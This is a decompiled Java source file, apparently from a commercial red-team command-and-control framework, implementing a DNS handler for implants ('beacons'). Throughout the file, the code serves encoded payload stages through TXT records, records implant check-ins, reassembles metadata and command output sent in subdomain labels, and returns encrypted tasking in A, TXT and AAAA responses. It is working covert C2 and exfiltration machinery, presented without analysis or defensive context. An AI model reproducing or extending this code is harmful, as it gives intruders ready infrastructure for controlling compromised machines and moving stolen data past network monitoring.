package beacon;

import beacon.dns.CacheManager;
import beacon.dns.ConversationManager;
import beacon.dns.RecvConversation;
import beacon.dns.SendConversation;
import c2profile.Profile;
import common.ArtifactUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import common.StringStack;
import dns.DNSServer;

public class BeaconDNS implements DNSServer.Handler {
   protected Profile c2profile;
   protected BeaconC2 controller;
   protected DNSServer.Response idlemsg;
   protected long idlemask;
   protected String stager_subhost;
   protected String stage = "";
   protected ScListener listener;
   protected CacheManager cache = new CacheManager();
   protected ConversationManager conversations;

   public BeaconDNS(ScListener var1, Profile var2, BeaconC2 var3) {
      this.c2profile = var2;
      this.controller = var3;
      this.idlemask = CommonUtils.ipToLong(var2.getString(".dns_idle"));
      this.idlemsg = DNSServer.A(this.idlemask);
      this.conversations = new ConversationManager(var2);
      this.listener = var1;
      if (!"".equals(var2.getString(".dns_stager_subhost"))) {
         this.stager_subhost = var2.getString(".dns_stager_subhost");
      } else {
         this.stager_subhost = null;
      }

   }

   public void setPayloadStage(byte[] var1) {
      this.stage = this.c2profile.getString(".dns_stager_prepend") + ArtifactUtils.AlphaEncode(var1);
   }

   protected DNSServer.Response serveStage(String var1) {
      int var2 = CommonUtils.toTripleOffset(var1) * 255;
      if (this.stage.length() != 0 && var2 <= this.stage.length()) {
         return var2 + 255 < this.stage.length() ? DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(var2, var2 + 255))) : DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(var2)));
      } else {
         return DNSServer.TXT(new byte[0]);
      }
   }

   public DNSServer.Response respond(String var1, int var2) {
      synchronized(this) {
         DNSServer.Response var10000;
         try {
            var10000 = this.respond_nosync(var1, var2);
         } catch (Exception var6) {
            MudgeSanity.logException("DNS request '" + var1 + "' type(" + var2 + ")", var6, false);
            return DNSServer.A(0L);
         }

         return var10000;
      }
   }

   public DNSServer.Response respond_nosync(String var1, int var2) {
      StringStack var3 = new StringStack(var1.toLowerCase(), ".");
      if (var3.isEmpty()) {
         return DNSServer.A(0L);
      } else {
         String var4 = var3.shift();
         if (var4.length() == 3 && "stage".equals(var3.peekFirst())) {
            return this.serveStage(var4);
         } else {
            String var5;
            String var6;
            if (!"cdn".equals(var4) && !"api".equals(var4) && !"www6".equals(var4)) {
               if (!"www".equals(var4) && !"post".equals(var4)) {
                  if (CommonUtils.isHexNumber(var4) && CommonUtils.isDNSBeacon(var4)) {
                     var4 = CommonUtils.toNumberFromHex(var4, 0) + "";
                     this.cache.purge(var4);
                     this.conversations.purge(var4);
                     this.controller.getCheckinListener().update(var4, System.currentTimeMillis(), (String)null, false);
                     return this.controller.isCheckinRequired(var4) ? DNSServer.A(this.controller.checkinMask(var4, this.idlemask)) : this.idlemsg;
                  } else if (this.stager_subhost != null && var1.length() > 4 && var1.toLowerCase().substring(3).startsWith(this.stager_subhost)) {
                     return this.serveStage(var1.substring(0, 3));
                  } else {
                     CommonUtils.print_info("DNS: ignoring " + var1);
                     return this.idlemsg;
                  }
               } else {
                  String var10 = "";
                  String var12 = var3.shift();
                  char var13 = var12.charAt(0);
                  var3 = new StringStack(var1.toLowerCase(), ".");
                  String var11 = var3.shift();
                  if (var13 == '1') {
                     var5 = var3.shift().substring(1);
                     var10 = var5;
                  } else if (var13 == '2') {
                     var5 = var3.shift().substring(1);
                     var6 = var3.shift();
                     var10 = var5 + var6;
                  } else {
                     String var17;
                     if (var13 == '3') {
                        var5 = var3.shift().substring(1);
                        var6 = var3.shift();
                        var17 = var3.shift();
                        var10 = var5 + var6 + var17;
                     } else if (var13 == '4') {
                        var5 = var3.shift().substring(1);
                        var6 = var3.shift();
                        var17 = var3.shift();
                        String var19 = var3.shift();
                        var10 = var5 + var6 + var17 + var19;
                     }
                  }

                  String var18 = var3.shift();
                  var4 = CommonUtils.toNumberFromHex(var3.shift(), 0) + "";
                  if (this.cache.contains(var4, var18)) {
                     return this.cache.get(var4, var18);
                  } else {
                     RecvConversation var14 = this.conversations.getRecvConversation(var4, var11);
                     var14.next(var10);
                     if (var14.isComplete()) {
                        this.conversations.removeConversation(var4, var11);

                        try {
                           if ("www".equals(var11)) {
                              this.controller.process_beacon_metadata(this.listener, "", var14.result());
                           } else if ("post".equals(var11)) {
                              this.controller.process_beacon_callback(var4, var14.result());
                           }
                        } catch (Exception var16) {
                           MudgeSanity.logException("Corrupted DNS transaction? " + var1 + ", type: " + var2, var16, false);
                        }
                     }

                     this.cache.add(var4, var18, this.idlemsg);
                     return this.idlemsg;
                  }
               }
            } else {
               var3 = new StringStack(var1.toLowerCase(), ".");
               var5 = var3.shift();
               var6 = var3.shift();
               var4 = CommonUtils.toNumberFromHex(var3.shift(), 0) + "";
               if (this.cache.contains(var4, var6)) {
                  return this.cache.get(var4, var6);
               } else {
                  SendConversation var7 = null;
                  if ("cdn".equals(var5)) {
                     var7 = this.conversations.getSendConversationA(var4, var5);
                  } else if ("api".equals(var5)) {
                     var7 = this.conversations.getSendConversationTXT(var4, var5);
                  } else if ("www6".equals(var5)) {
                     var7 = this.conversations.getSendConversationAAAA(var4, var5);
                  }

                  DNSServer.Response var8 = null;
                  if (!var7.started() && var2 == 16) {
                     var8 = DNSServer.TXT(new byte[0]);
                  } else if (!var7.started()) {
                     byte[] var9 = this.controller.dump(var4, 72000, 1048576);
                     if (var9.length > 0) {
                        var9 = this.controller.getSymmetricCrypto().encrypt(var4, var9);
                        var8 = var7.start(var9);
                     } else if (var2 == 28 && "www6".equals(var5)) {
                        var8 = DNSServer.AAAA(new byte[16]);
                     } else {
                        var8 = DNSServer.A(0L);
                     }
                  } else {
                     var8 = var7.next();
                  }

                  if (var7.isComplete()) {
                     this.conversations.removeConversation(var4, var5);
                  }

                  this.cache.add(var4, var6, var8);
                  return var8;
               }
            }
         }
      }
   }
}
